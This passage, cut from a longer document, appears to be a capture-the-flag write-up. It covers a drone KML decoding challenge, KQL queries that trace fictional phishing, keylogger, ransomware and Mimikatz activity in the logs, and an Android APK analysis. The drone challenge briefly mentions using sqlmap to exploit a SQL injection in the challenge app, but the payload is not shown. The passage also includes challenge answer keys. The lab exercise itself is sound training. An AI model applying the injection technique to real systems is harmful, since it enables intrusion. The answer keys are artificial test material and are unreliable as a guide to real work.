&lt;PolyStyle&gt;\n                &lt;color&gt;40ffffff&lt;/color&gt;\n            &lt;/PolyStyle&gt;\n            &lt;BalloonStyle&gt;\n                &lt;displayMode&gt;hide&lt;/displayMode&gt;\n            &lt;/BalloonStyle&gt;\n        &lt;/Style&gt;\n    &lt;/gx:CascadingStyle&gt;\n    &lt;gx:CascadingStyle kml:id=\"__managed_style_177256F1433251C4AAA6\"&gt;\n        &lt;Style&gt;\n            &lt;IconStyle&gt;\n                &lt;Icon&gt;\n                    &lt;href&gt;https://earth.google.com/earth/rpc/cc/icon?color=1976d2&amp;amp;id=2000&amp;amp;scale=4&lt;/href&gt;\n                &lt;/Icon&gt;\n                &lt;hotSpot x=\"64\" y=\"128\" xunits=\"pixels\" yunits=\"insetPixels\"/&gt;\n            &lt;/IconStyle&gt;\n            &lt;LabelStyle&gt;\n            &lt;/LabelStyle&gt;\n            &lt;LineStyle&gt;\n                &lt;color&gt;ff2dc0fb&lt;/color&gt;\n                &lt;width&gt;4&lt;/width&gt;\n            &lt;/LineStyle&gt;\n            &lt;PolyStyle&gt;\n                &lt;color&gt;40ffffff&lt;/color&gt;\n            &lt;/PolyStyle&gt;\n            &lt;BalloonStyle&gt;\n                &lt;displayMode&gt;hide&lt;/displayMode&gt;\n            &lt;/BalloonStyle&gt;\n        &lt;/Style&gt;\n    &lt;/gx:CascadingStyle&gt;\n    &lt;StyleMap id=\"__managed_style_08C7CAFB983251C4AAA6\"&gt;\n        &lt;Pair&gt;\n            &lt;key&gt;normal&lt;/key&gt;\n            &lt;styleUrl&gt;#__managed_style_177256F1433251C4AAA6&lt;/styleUrl&gt;\n        &lt;/Pair&gt;\n        &lt;Pair&gt;\n            &lt;key&gt;highlight&lt;/key&gt;\n            &lt;styleUrl&gt;#__managed_style_2398E937F13251C4AAA6&lt;/styleUrl&gt;\n        &lt;/Pair&gt;\n    &lt;/StyleMap&gt;\n    &lt;Placemark id=\"06AEB73AFD323DB38AEB\"&gt;\n        &lt;name&gt;fritjolf-Path&lt;/name&gt;\n        &lt;LookAt&gt;\n            &lt;longitude&gt;144.8567879816271&lt;/longitude&gt;\n            &lt;latitude&gt;-37.42277804382341&lt;/latitude&gt;\n            &lt;altitude&gt;500&lt;/altitude&gt;\n            &lt;heading&gt;0&lt;/heading&gt;\n            &lt;tilt&gt;45&lt;/tilt&gt;\n            &lt;gx:fovy&gt;35&lt;/gx:fovy&gt;\n            &lt;range&gt;1000&lt;/range&gt;\n            &lt;altitudeMode&gt;absolute&lt;/altitudeMode&gt;\n        &lt;/LookAt&gt;\n        &lt;styleUrl&gt;#__managed_style_08C7CAFB983251C4AAA6&lt;/styleUrl&gt;\n        &lt;LineString&gt;\n            &lt;coordinates&gt;\n                144.8567879816271,-37.42277804382341,100  &lt;!-- Altitude: 100 --&gt;\n                142.4357677725014,-38.0569169391843,200  &lt;!-- Altitude: 200 --&gt;\n                143.9329094555584,-37.80217469906655,150  &lt;!-- Altitude: 150 --&gt;\n                142.2754454646221,-38.0682499155867,250  &lt;!-- Altitude: 250 --&gt;\n                141.756352258091,-34.52324587244343,300  &lt;!-- Altitude: 300 --&gt;\n                145.513859306511,-36.74357572393437,350  &lt;!-- Altitude: 350 --&gt;\n                144.745994150535,-37.89721189352699,400  &lt;!-- Altitude: 400 --&gt;\n                145.8966329539992,-37.00702150480869,450  &lt;!-- Altitude: 450 --&gt;\n            &lt;/coordinates&gt;\n        &lt;/LineString&gt;\n    &lt;/Placemark&gt;\n&lt;/Document&gt;\n&lt;/kml&gt;\n</code></pre> <p>We open this file in Google Earth and see the following:</p> <p></p> <p>New path.</p> <p>Zooming in on the points, it appears they represent letters in a very creative way:</p> <p></p> <p>The letter 'K' encoded in aligned trees.</p> <p>Looking at all the points, we get the following code: <code>ELF-HAWK</code>. This seems to be a drone name and we can get more details using the drone workshop on the web app:</p> <pre><code>Drone Details\nName: ELF-HAWK, Quantity: 40, Weapons: Snowball-launcher\n\nComments for ELF-HAWK\nThese drones will work great to find Alabasters snowball warehouses. I have hid the activation code in the dataset ELF-HAWK-dump.csv. We need to keep it safe, for now it's under /files/secret.\nWe need to make sure we have enough of these drones ready for the upcoming operation. Well done on hiding the activation code in the dataset. If anyone finds it, it will take them a LONG time or forever to carve the data out, preferably the LATTER.\n</code></pre> <p>We need to find another code in the dataset we are linked to. This .csv file is similar as the previous one but has many more rows (~3k). This time we'll need a script to generate a .kml file.</p> AI usage <p>We prompted ChatGPT to create a script to generate a .kml file from a set of coordinates, based on the previous .kml file it generated for us.</p> Script to generate .kml file <pre><code>import xml.etree.ElementTree as ET\n\n# Function to generate KML from coordinates and altitudes\ndef generate_kml(coordinates, output_file='output.kml'):\n    # Create the KML structure\n    kml_ns = {\"kml\": \"http://www.opengis.net/kml/2.2\", \"gx\": \"http://www.google.com/kml/ext/2.2\"}\n    kml = ET.Element(\"kml\", xmlns=\"http://www.opengis.net/kml/2.2\", xmlns_gx=\"http://www.google.com/kml/ext/2.2\")\n    document = ET.SubElement(kml, \"Document\")\n\n    # Add name and styles\n    name = ET.SubElement(document, \"name\")\n    name.text = \"fritjolf-Path\"\n\n    # LookAt element (can be adjusted based on desired viewpoint)\n    look_at = ET.SubElement(document, \"LookAt\")\n    ET.SubElement(look_at, \"longitude\").text = str(coordinates[0][0])  # Using first longitude\n    ET.SubElement(look_at, \"latitude\").text = str(coordinates[0][1])   # Using first latitude\n    ET.SubElement(look_at, \"altitude\").text = \"500\"  # Adjust this value as needed\n    ET.SubElement(look_at, \"heading\").text = \"0\"\n    ET.SubElement(look_at, \"tilt\").text = \"45\"\n    ET.SubElement(look_at, \"gx:fovy\").text = \"35\"\n    ET.SubElement(look_at, \"range\").text = \"1000\"\n    ET.SubElement(look_at, \"altitudeMode\").text = \"absolute\"\n\n    # Placemark for the path\n    placemark = ET.SubElement(document, \"Placemark\")\n    ET.SubElement(placemark, \"name\").text = \"fritjolf-Path\"\n    ET.SubElement(placemark, \"styleUrl\").text = \"#__managed_style_08C7CAFB983251C4AAA6\"\n\n    # LineString to define the path with coordinates and altitudes\n    line_string = ET.SubElement(placemark, \"LineString\")\n    coordinates_elem = ET.SubElement(line_string, \"coordinates\")\n\n    # Add each coordinate pair with altitude\n    for coord in coordinates:\n        # Each coordinate is in the form (longitude, latitude, altitude)\n        coord_str = f\"{coord[0]},{coord[1]},{coord[2]}\"\n        coordinates_elem.text = (coordinates_elem.text or '') + coord_str + \" \"\n\n    # Write the KML to a file\n    tree = ET.ElementTree(kml)\n    with open(output_file, \"wb\") as f:\n        tree.write(f)\n\n# Example usage\n# Your list of coordinates: [(longitude, latitude, altitude), ...]\ncoordinates = [\n    INSERT COORDINATES\n]\n\n# Generate the KML file\ngenerate_kml(coordinates, 'path_with_altitude.kml')\n</code></pre> <p>This time, the generated .kml file doesn't correctly show us a code in Google Earth. We try to use some other websites but they all fail to show the complete word. When we use the open-source QGIS cartography app, we get better results:</p> <p></p> <p>The encoded word shows up in QGIS.</p> <p>Answer</p> <p>The admin code and answer is <code>DroneDataAnalystExpertMedal</code></p> Chimney Scissorsticks <p>Bravo! You've tackled the drone challenge and navigated through those KML files like a true expert. Your skills are just what we need to prevent the big snowball battle\u2014the North Pole thanks you!</p> <p>Well done! You cracked the code from the drones and showed you've mastered the basics of KML files. This kind of expertise will be invaluable as we gear up for what\u2019s ahead!</p> <p>But I need you to dig deeper. Make sure you\u2019re checking those file structures carefully, and remember\u2014rumor has it there is some injection flaw that might just give you the upper hand. Keep your eyes sharp!</p> <p>Chimney shared some additional information about a possible SQL injection flaw being present on the web application. It seems like the drone workshop input field is not throttled. We use sqlmap and find the following SQL injection:</p> <p></p> <p>SQL injection giving us all available drones in the workshop.</p> <p>The page for <code>Pigeon-Lookalike-v4</code> has some interesting details:</p> <p><code>There was some talk about only TRUE carvers would find secrets and that FALSE ones would never find it.</code></p> <p>This seems to be another hint. We go back to our most recent .csv file as there many columns that contain TRUE/FALSE as values. They seem to alternate quite a lot between the rows. This could be encoded data. We do the following:</p> <ul> <li>We remove all columns that are not representing a boolean value.</li> <li>We replace all <code>TRUE</code> with <code>1</code>, and <code>FALSE</code> with <code>0</code>.</li> <li>We copy the data and make sure to clean it properly in a text editor.</li> <li>We use CyberChef to convert it with the recipe 'from binary'.</li> </ul> <p>We then get ASCII art that contains the code, how creative!</p> ASCII art <pre><code>:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*::::::::::::::::::\n:::::::::::::::::::::::::::::::-------------=--------::::::::::::::::::::::::::::::::::::\n::::::::::::::::::::::------------------------===-=======--=-::::::::::-:::::::::::::::::\n::::::::::::::::::::------------:------------=-====================---:::::::::=+::::::::\n:::::::::::::::::------------------------------=====================-------::::::::::::::\n::::::::::::::-------------------------------------================:------:::::::::::::::\n::::::::::::--------------------------------------==============-::--------:::::::::-::::\n::::::::::::-------:--------@+:::::::::--=@--------:===========-::-::----==---:::::::::::\n::::-------:::::----------@---::::::---+-==+@--------=========-:--:------=====---::::::::\n::::--------::::::-------#--------------=-+@------------===------::-----====--==---::::::\n::::-------:-:::::::------@=@=++#+++++@@@@@=-----------------:::--------------==---::::::\n::::----------::::=-#-:----**%@+++++++%@@=::::::---%@------:--------:--@-+::-------::::::\n::::-----:----:::::::::::--::@@**%@--::::::::::::::--=+@------------@--:::::------@::::::\n::::---+@::::::---+@:::::::::#@-@--:::::-:=*=-::-----=+*=*=--------@:--:::::::-----=:::::\n::::@-:::-::::::-----=@:-:::@+@%---------------==-==+@@@@@=@------@---------:::::--==+%::\n:::#:::::::::::-----=+*@:::%#@#-=---------===++*%@@+@=+*#-+*=@-----#====-----------**-%::\n::@--::-:::--:---==++*@-:@=+@=+-@=*+++++++**@#%*@-##**-@##%=#%@@@@#*@###@=+**@*****@@@:::\n:::@*=--++++++++**@@@@@@*#@-+%@*=*+****@@@+@***@%@@%%%@-%@*@@@@@@@@@@@@@@%%#%%%@@@@@%::::\n:::@@@@@@@++#*####@@@@@@@==---====+##@*%=+@*@*%%@@@@@@@@@@@@@@@=--@+@@@@+@@@@@@@@@@-:::::\n::::=*%%%%%%%%%%%@@%@@#@-#*+++++====@-++###@%@*@@@@+@@@@-**+--::::--@@%@%%@%%%%%@@@-:::::\n::::---@@@@##@@@@@@@@@--+@%-#+#**+=+++**%@@@@@@@##%**%--:::::::--*----=*@@@@@@@*@@---::::\n::::---@@***%%%%@@@@*@-=-+=@#=#%##***##@@@@@#@@*@%%==---:::::::::::----=+---------=--::::\n::::----@+=%#@@@=@@-----##@+:-=%@@%##%@@@@@@@@@@@@*+=-----::::::::::::=+*-@:----===--::::\n::::---------------------*@##=+@@%@==-+@@@@@@@@@@@-+=---------------===+**--=======-:::::\n:::---------------:------%+#%@@@@@#%%%%@@@@#@@@@@@@-+======---------==***#@========-:::::\n:::-%-%---------:---------*-*##%@@@@@@@@@@@@@@@@@--=@@-*===++++++++++***@*===++++++=-::::\n:::--+---------=-------:-----#==#@%%%@@@@@*@%@@@----@+@@@=***@@@@***@@@@%===++++-++=-::::\n:::--------------:::::--------------##-----@@--------@%@#@@%%%%@@@@@@#@=====+++++++=-::::\n:::---------------::::::---------------------=====---@@##@@@@@@@@@@@#%#-=====+++++--:::::\n:::---======-------------------------=----==========--*=@@%@++*@@%%%@@-======:----==-::::\n:::---===============------------------===============-----#@@@@@-----===-::---=====-::::\n:::--=============+===--------------===-==================--------======::----=======-:::\n:::--================---::::-=======-======================+=====+====::------===+===-:::\n:::--===================--:::::====================+====-:---==+++=::-----=======---=-:::\n:::--========:===========------:=====================:::-----====:-----==========+===-:::\n/ ___/ _ \\|  _ \\| ____\\ \\      / / _ \\|  _ \\|  _ \\   _____  ====:-----==========+===-:::\n| |  | | | | | | |  _|  \\ \\ /\\ / / | | | |_) | | | | |_____| ====:-----==========+===-:::\n| |__| |_| | |_| | |___  \\ V  V /| |_| |  _ &lt;| |_| | |_____| ====:-----==========+===-:::\n\\____\\___/|____/|_____|__\\_/\\_/__\\___/|_| \\_\\____/  _  _________   ______    _    ____\n| ____\\ \\/ /  _ \\| ____|  _ \\_   _|_   _| | | |  _ \\| |/ / ____\\ \\ / / ___|  / \\  |  _ \\\n|  _|  \\  /| |_) |  _| | |_) || |   | | | | | | |_) | ' /|  _|  \\ V / |     / _ \\ | |_) |\n| |___ /  \\|  __/| |___|  _ &lt; | |   | | | |_| |  _ &lt;| . \\| |___  | || |___ / ___ \\|  _ &lt;\n|_____/_/\\_\\_| __|_____|_|_\\_\\|_| __|_|  \\___/|_| \\_\\_|\\_\\_____| |_| \\____/_/   \\_\\_| \\_\\\n\\ \\   / / ____|  _ \\|  \\/  | ____|  _ \\  / \\  | |    ==========---======++++=+=--+++=-:::\n\\ \\ / /|  _| | |_) | |\\/| |  _| | | | |/ _ \\ | |    ==========---======++++=+=--+++=-:::\n\\ V / | |___|  _ &lt;| |  | | |___| |_| / ___ \\| |___ ==========---======++++=+=--+++=-:::\n\\_/  |_____|_| \\_\\_|  |_|_____|____/_/   \\_\\_____|==========---======++++=+=--+++=-:::\n::::--====+++=---++++++=+========------::::=-:---==============---======++++=+=--+++=-:::\n::::--==+++++++==---+++++++++++========-----================++++==-========-++=++====-:::\n:::::--====+++++-++--++++++++++=--------=-==============+++---------=====++=+++++::::::::\n::::::::======+++=+++=+++++++++++++++=++++===========++++:-------=---=-=----:::::::::::::\n::::::::::::::::--=-=======++=++++++++++++++============--------------:::::::::::::::::::\n:::::::::::::::::::::::::::------===-==-===-==-----::-:::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n</code></pre> <p>Answer</p> <p>Answer is <code>EXPERTTURKEYCARVERMEDAL</code></p>"},{"location":"act_2/drone_path/#response","title":"Response","text":"Chimney Scissorsticks <p>Absolutely fantastic! I think you found the most difficult path in, from file carving to SQL injection. Not many can do that, but you've shown you\u2019re ready for anything the factions throw your way!</p>"},{"location":"act_2/microsoft_kc7/","title":"Microsoft KC7","text":"<p>Difficulty: </p>"},{"location":"act_2/microsoft_kc7/#objective","title":"Objective","text":"<p>Task description</p> <p>Answer two sections for silver, all four sections for gold.</p> <p>KQL 101</p> <p>Learn and practice basic KQL queries to analyze data logs for North Pole operations.</p> <p>Operation Surrender</p> <p>Investigate a phishing attack targeting Wombley\u2019s team, uncovering espionage activities.</p> <p>Operation Snowfall</p> <p>Track and analyze the impacts of a ransomware attack initiated by Wombley\u2019s faction.</p> <p>Echoes in the Frost</p> <p>Use logs to trace an unknown phishing attack targeting Alabaster\u2019s faction.</p> Pepper Minstix <p>This is weird, I got some intel about an imminent attack.</p> <p>Pepper Minstix here! I\u2019ve got urgent news from neutral ground.</p> <p>The North Pole is facing a serious cyber threat, and it\u2019s putting all the factions on edge. The culprits? Some troublemakers from Team Wombley.</p> <p>They\u2019ve launched a barrage of phishing attacks, ransomware, and even some sneaky espionage, causing quite the stir.</p> <p>It\u2019s time to jump into action and get cracking on this investigation\u2014there\u2019s plenty of cyber-sleuthing to do.</p> <p>You\u2019ll be digging into KQL logs, tracking down phishing schemes, and tracing compromised accounts like a seasoned pro.</p> <p>Malware infections have already breached Alabaster Snowball\u2019s systems, so we need swift action.</p> <p>Your top mission: neutralize these threats, with a focus on the ransomware wreaking havoc from Team Wombley.</p> <p>It\u2019s a hefty challenge, but I know you\u2019re up to it. We need your expertise to restore order and keep the peace.</p> <p>You\u2019ve got the tools, the skills, and the know-how\u2014let\u2019s show Team Wombley we mean business.</p> <p>Ready to dive in? Let's defend the North Pole and bring back the holiday harmony!</p> Wunorse Openslae <p>Hey, Wunorse here. We at Team Wombley pulled off some nasty stuff.</p> <p>Phishing attacks, ransomware, and cyber espionage, oh yeah!</p> <p>We pulled loads of all-nighters to make it all happen. Energy drinks rock!</p> <p>Our teams did what Alabaster said we never could and breached Santa's network. We're so rad.</p> <p>It would take a master defender to fix all the damage we caused. But defense is so lame! Offense is where it's at.</p> <p>You should just leave them to panic and join our side. We're the coolest, don't you want to be like us?</p>"},{"location":"act_2/microsoft_kc7/#hints","title":"Hints","text":"<p>There are no hints available.</p>"},{"location":"act_2/microsoft_kc7/#solution","title":"Solution","text":"Section 1: KQL 101Section 2: Operation Surrender: Alabaster's EspionageSection 3: Operation Snowfall: Team Wombley's Ransomware RaidSection 4: Echoes in the Frost: Tracking the Unknown Threat Solution to Question 1 <p>Answer: <code>let's do this</code></p> Solution to Question 2 <p>Answer: <code>when in doubt take 10</code></p> Solution to Question 3 <p><pre><code>Employees\n| count\n</code></pre> Answer: <code>90</code></p> Solution to Question 4 <p><pre><code>Employees\n| where role == \"Chief Toy Maker\"\n| project name\n</code></pre> Answer: <code>Shinny Upatree</code></p> Solution to Question 5 <p>Answer: <code>Operator</code></p> Solution to Question 6 <pre><code>let email = Employees\n| where name == \"Angel Candysalt\"\n| project email_addr;\nEmail\n| where recipient in (email)\n| count\n</code></pre> <p>Answer: <code>31</code></p> Solution to Question 7 <pre><code>Email\n| where sender == \"twinkle_frostington@santaworkshopgeeseislands.org\"\n| distinct recipient\n| count\n</code></pre> <p>Answer: <code>32</code></p> Solution to Question 8 <pre><code>let ip = Employees\n| where name == \"Twinkle Frostington\"\n| project ip_addr;\nOutboundNetworkEvents\n| where src_ip in (ip)\n| distinct url\n| count\n</code></pre> <p>Answer: <code>4</code></p> Solution to Question 9 <pre><code>PassiveDns\n| where domain contains \"green\"\n| distinct domain\n| count\n</code></pre> <p>Answer: <code>10</code></p> Solution to Question 10 <pre><code>let twinkle_ips =\nEmployees\n| where name has \"Twinkle\"\n| distinct ip_addr;\nOutboundNetworkEvents\n| where src_ip in (twinkle_ips)\n| distinct url\n| count\n</code></pre> <p>Answer: <code>8</code></p> Solution to Question 1 <p>Answer: <code>`surrender</code></p> Solution to Question 2 <pre><code>Email\n| where subject contains \"surrender\"\n| distinct sender\n</code></pre> <p>Answer: <code>surrender@northpolemail.com</code></p> Solution to Question 3 <pre><code>Email\n| where subject contains \"surrender\"\n| distinct recipient\n| count\n</code></pre> <p>Answer: <code>22</code></p> Solution to Question 4 <pre><code>Email\n| where subject contains \"surrender\"\n| project link\n| distinct link\n</code></pre> <p>Answer: <code>Team_Wombley_Surrender.doc</code></p> Solution to Question 5 <pre><code>Employees\n| join kind=inner (\n    OutboundNetworkEvents\n) on $left.ip_addr == $right.src_ip\n| where url contains \"Team_Wombley_Surrender.doc\"\n| project name, ip_addr, url, timestamp\n| sort by timestamp asc\n| take 1\n</code></pre> <p>Answer: <code>Joyelle Tinseltoe</code></p> Solution to Question 6 <pre><code>let user_host = Employees\n| where name == \"Joyelle Tinseltoe\"\n| project hostname;\nProcessEvents\n| where timestamp between(datetime(\"2024-11-27T14:11:45Z\") .. datetime(\"2024-11-27T14:15:45Z\"))\n| where hostname in (user_host)\n| distinct process_name\n</code></pre> <p>Answer: <code>keylogger.exe</code></p> Solution to Question 7 <pre><code>let flag = \"keylogger.exe\";\nlet base64_encoded = base64_encode_tostring(flag);\nprint base64_encoded\n</code></pre> <p>Answer: <code>a2V5bG9nZ2VyLmV4ZQ==</code></p> Solution to Question 1 <p>Answer: <code>snowfall</code></p> Solution to Question 2 <pre><code>AuthenticationEvents\n| where result == \"Failed Login\"\n| summarize FailedAttempts = count() by username, src_ip, result\n| where FailedAttempts &gt;= 5\n| sort by FailedAttempts desc\n</code></pre> <p>Answer: <code>59.171.58.12</code></p> Solution to Question 3 <pre><code>AuthenticationEvents\n| where src_ip == \"59.171.58.12\"\n| where result contains \"Success\"\n| distinct username\n| count\n</code></pre> <p>Answer: <code>23</code></p> Solution to Question 4 <pre><code>AuthenticationEvents\n| where src_ip == \"59.171.58.12\"\n| where result contains \"Success\"\n| project description\n</code></pre> <p>Answer: <code>RDP</code></p> Solution to Question 5 <pre><code>let user_host = Employees\n| where name contains \"Alabaster\"\n| project hostname;\nlet start_time = toscalar(AuthenticationEvents\n| where src_ip == \"59.171.58.12\"\n| where result contains \"Success\"\n| where hostname in (user_host)\n| project timestamp);\nProcessEvents\n| where hostname in (user_host)\n| where timestamp &gt; start_time\n</code></pre> <p>Answer: <code>Secret_Files.zip</code></p> Solution to Question 6 <pre><code>let user_host = Employees\n| where name contains \"Alabaster\"\n| project hostname;\nlet start_time = toscalar(AuthenticationEvents\n| where src_ip == \"59.171.58.12\"\n| where result contains \"Success\"\n| where hostname in (user_host)\n| project timestamp);\nProcessEvents\n| where hostname in (user_host)\n| where timestamp &gt; start_time\n</code></pre> <p>Answer: <code>EncryptEverything.exe</code></p> Solution to Question 7 <pre><code>let flag = \"EncryptEverything.exe\";\nlet base64_encoded = base64_encode_tostring(flag);\nprint base64_encoded\n</code></pre> <p>Answer: <code>RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl</code></p> Solution to Question 1 <p>Answer: <code>stay frosty</code></p> Solution to Question 2 <pre><code>Email\n| where subject contains \"credential\"\n| sort by timestamp asc\n| take 1\n</code></pre> <p>Answer: <code>2024-12-12T14:48:55Z</code></p> Solution to Question 3 <pre><code>let ip = Employees\n| where name == \"Noel Boetie\"\n| project ip_addr;\nOutboundNetworkEvents\n| where src_ip in (ip)\n| where url contains \"holidaybargainhunt\"\n| sort by timestamp asc\n| take 1\n</code></pre> <p>Answer: <code>2024-12-12T15:13:55Z</code></p> Solution to Question 4 <pre><code>PassiveDns\n| where domain == \"holidaybargainhunt.io\"\n| distinct ip\n</code></pre> <p>Answer: <code>182.56.23.122</code></p> Solution to Question 5 <pre><code>AuthenticationEvents\n| where src_ip == \"182.56.23.122\"\n</code></pre> <p>Answer: <code>WebApp-ElvesWorkshop</code></p> Solution to Question 6 <pre><code>let auth_time = toscalar(AuthenticationEvents\n| where src_ip == \"182.56.23.122\"\n| project timestamp);\nProcessEvents\n| where hostname == \"WebApp-ElvesWorkshop\"\n| where timestamp &gt; auth_time\n</code></pre> <p>Answer: <code>Invoke-Mimikatz.ps1</code></p> Solution to Question 7 <pre><code>let ip = Employees\n| where name == \"Noel Boetie\"\n| project ip_addr;\nlet download_time = toscalar(OutboundNetworkEvents\n| where src_ip in (ip)\n| where url contains \"holidaybargainhunt\"\n| sort by timestamp asc\n| take 1\n| project timestamp);\nProcessEvents\n| where hostname == \"Elf-Lap-A-Boetie\"\n| where timestamp &gt; download_time\n| sort by timestamp asc\n</code></pre> <p>Answer: <code>2024-12-12T15:14:38Z</code></p> Solution to Question 8 <pre><code>let user_ip = Employees\n| where name == \"Noel Boetie\"\n| project ip_addr;\nlet download_time = toscalar(FileCreationEvents\n| where hostname == \"Elf-Lap-A-Boetie\"\n| where filename == \"holidaycandy.hta\"\n| sort by timestamp asc\n| project timestamp\n| take 1);\nOutboundNetworkEvents\n| where timestamp &gt; download_time\n| where src_ip in (user_ip)\n| sort by timestamp asc\n</code></pre> <p>Answer: <code>compromisedchristmastoys.com</code></p> Solution to Question 9 <pre><code>let ip = Employees\n| where name == \"Noel Boetie\"\n| project ip_addr;\nlet download_time = toscalar(OutboundNetworkEvents\n| where src_ip in (ip)\n| where url contains \"holidaybargainhunt\"\n| sort by timestamp asc\n| take 1\n| project timestamp);\nProcessEvents\n| where hostname == \"Elf-Lap-A-Boetie\"\n| where timestamp &gt; download_time\n| sort by timestamp asc\n</code></pre> <p>Answer: <code>sqlwriter.exe</code></p> Solution to Question 10 <pre><code>let ip = Employees\n| where name == \"Noel Boetie\"\n| project ip_addr;\nlet download_time = toscalar(OutboundNetworkEvents\n| where src_ip in (ip)\n| where url contains \"holidaybargainhunt\"\n| sort by timestamp asc\n| take 1\n| project timestamp);\nProcessEvents\n| where hostname == \"Elf-Lap-A-Boetie\"\n| where timestamp &gt; download_time\n| sort by timestamp asc\n</code></pre> <p>Answer: <code>frosty</code></p> Solution to Question 11 <pre><code>let finalflag = \"frosty\";\nlet base64_encoded = base64_encode_tostring(finalflag);\nprint base64_encoded\n</code></pre> <p>Answer: <code>ZnJvc3R5</code></p>"},{"location":"act_2/microsoft_kc7/#response","title":"Response","text":"Pepper Minstix <p>Outstanding work! You've expertly sifted through the chaos of the KQL logs and uncovered crucial evidence. We're one step closer to saving the North Pole!</p> <p>Bravo! You've traced those phishing emails back to their devious source. Your sharp detective skills are keeping our elves safe from harm!</p> <p>Fantastic! You've tracked down the compromised accounts and put a stop to the malicious activity. Our systems are stronger thanks to you!</p> <p>Incredible! You've neutralized the ransomware and restored order across the North Pole. Peace has returned, and it's all thanks to your relentless determination!</p> <p>Ho-ho-holy snowflakes! You've done it! With the precision of a candy cane craftsman and the bravery of a reindeer on a foggy night, you've conquered all four tasks! You're a true holiday hero!</p> Wunorse Openslae <p>Dude, c'mon. I thought we were bros! Why are you messin' with our achievements like that?</p> <p>Those phishing emails were totally devious, you gotta admit. Now let's head over to Wombley HQ and I'll show you how we craft them.</p> <p>Hey, we needed those accounts! Alright, broseph, you got one more chance or I'm telling Wombley how lame you are.</p> <p>Why you gotta be like that? Not cool. We worked so hard on that ransomware, and you dismantled the whole thing. So many wasted energy drinks...</p> <p>Whatevs, it's all good. This was just a practice run anyways. The real attack is going down later. And it's gonna be sick!</p>"},{"location":"act_2/mobile_analysis/","title":"Mobile Analysis","text":"<p>Difficulty: </p>"},{"location":"act_2/mobile_analysis/#objective","title":"Objective","text":"<p>Task description</p> <p>Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.</p> Eve Snowshoes <p>Hi there, tech saviour! Eve Snowshoes and Team Alabaster in need of assistance.</p> <p>I've been busy creating and testing a modern solution to Santa\u2019s Naughty-Nice List, and I even built an Android app to streamline things for Alabaster\u2019s team.</p> <p>But here\u2019s my tiny reindeer-sized problem: I made a debug version and a release version of the app.</p> <p>I accidentally left out a child's name on each version, but for the life of me, I can't remember who!</p> <p>Could you start with the debug version first, figure out which child\u2019s name isn\u2019t shown in the list within the app, then we can move on to release? I\u2019d be eternally grateful!</p>"},{"location":"act_2/mobile_analysis/#hints","title":"Hints","text":"Mobile Analysis Easy - Missing <p>Maybe look for what names are included and work back from that?</p> Mobile Analysis Easy - Tools <p>Try using apktool or jadx</p> Mobile Analysis Hard - Encryption and Obfuscation <p>Obfuscated and encrypted? Hmph. Shame you can't just run strings on the file.</p> Mobile Analysis Hard - Format <p>So yeah, have you heard about this new Android app format? Want to convert it to an APK file?</p>"},{"location":"act_2/mobile_analysis/#solution","title":"Solution","text":"SilverGold <p>This challenge gives us two files to unpack; one release version (.aab file) and one debug version (.apk). The debug version should contain the most information as it hasn't been optimized for size yet and should be easier to work with. I opted to go for APK tool to unpack the .apk file as my first time working with Android apps. I used Waydroid to emulate the app on my desktop (1).</p> <ol> <li><code>waydroid app install SantaSwipe.apk</code></li> </ol> AI usage <p>I prompted ChatGPT to explain typical folders you can expect when using APK tool on an .apk file:</p> <pre><code>When you use **APKTool** to decompile an APK file, it extracts and organizes the APK's resources and code into several typical folders. Here are the most common folders and their purposes:\n\n1. **`smali/`**:\n- Contains the disassembled **Dalvik bytecode** files in Smali format (`.smali` files).\n- Each Smali file corresponds to a Java class and is written in a human-readable assembly-like syntax.\n\n2. **`res/`**:\n- Holds the **compiled resources** of the application (e.g., XML files for layouts, drawables, animations, etc.).\n- Subfolders include:\n    - `drawable/` (images)\n    - `layout/` (UI definitions)\n    - `values/` (strings, dimensions, colors)\n    - Others like `anim/`, `menu/`, `xml/`, depending on the APK.\n\n3. **`AndroidManifest.xml`**:\n- The **manifest file**, decompiled into readable XML.\n- Contains metadata about the app, including permissions, services, activities, and intent filters.\n\n4. **`assets/`**:\n- Stores **raw assets** that are bundled with the app.\n- These files are not compiled, so they remain in their original formats, like `.txt`, `.json`, or media files.\n\n5. **`lib/`**:\n- Contains native libraries in `.so` format for different CPU architectures (e.g., `armeabi-v7a`, `arm64-v8a`, `x86`).\n\n6. **`original/`**:\n- Stores original files from the APK that are not decompiled or modified.\n- May include a copy of the `META-INF/` folder (used for app signature information).\n\n7. **`META-INF/`** (optional):\n- May be extracted separately if `--keep-resources` or related options are used.\n- Contains APK signature files (`MANIFEST.MF`, `CERT.RSA`, `CERT.SF`).\n\n8. **`unknown/`** (optional):\n- Holds any files APKTool could not recognize or process (e.g., unusual file types or encrypted data).\n\n9. **`build/`**:\n- Temporary files created during the rebuilding process when recompiling the APK.\n- Generally absent after decompilation but appears during recompilation.\n\nThese folders give you access to the application's structure for analysis, modification, or reverse engineering. You can modify the resources or Smali code, then recompile the APK using APKTool.\n</code></pre> <p>The application shows us a bunch of names with apparently one missing. Exploring the extracted files, we find references to a file <code>naughtynicelist.db</code> which likely holds all the names. We can extract them using these commands in our Waydroid emulation session:</p> <pre><code>sudo wayland shell\n\n:/data/data/com.northpole.santaswipe/databases # ls\nnaughtynicelist.db  naughtynicelist.db-journal\n\nsqlite3 naughtynicelist.db\nsqlite&gt; .tables\nNaughtyList       NiceList          NormalList        android_metadata\nsqlite&gt; select * from NormalList;\n</code></pre> <p>The 'NiceList' and 'NormalList' are empty which suggests that these are saturated by the application. The objective wants us to look for a missing name in the app, not in the database. We can therefore cross-check the names listed in the application and the database to find the missing name:</p> <p>Answer</p> <p><code>Ellie, Alabama, USA</code></p> <p>Alternative answer</p> <p>The extracted files contain code to load the names except Ellie:</p> <pre><code>grep -rn ./ -e 'Ellie'\n./smali_classes3/com/northpole/santaswipe/MainActivity$WebAppInterface.smali:1090:    const-string v3, \"SELECT Item FROM NormalList WHERE Item NOT LIKE 